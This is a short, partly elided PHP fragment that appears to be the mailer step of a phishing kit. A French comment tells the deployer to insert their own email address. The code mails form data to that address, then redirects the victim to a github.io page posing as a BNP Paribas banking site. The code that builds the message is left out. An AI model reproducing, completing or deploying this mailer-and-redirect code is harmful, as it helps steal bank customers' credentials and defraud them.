<?php
// j'explique clairement tonsite@tondomaine.com , vous mettez ta boite email de ton site 
...
mail($TO, $subject, $message, $headers);
 ...
 header('location:https://antille-guyane.github.io/bnpparibas.net/dciweb8dcc.html');
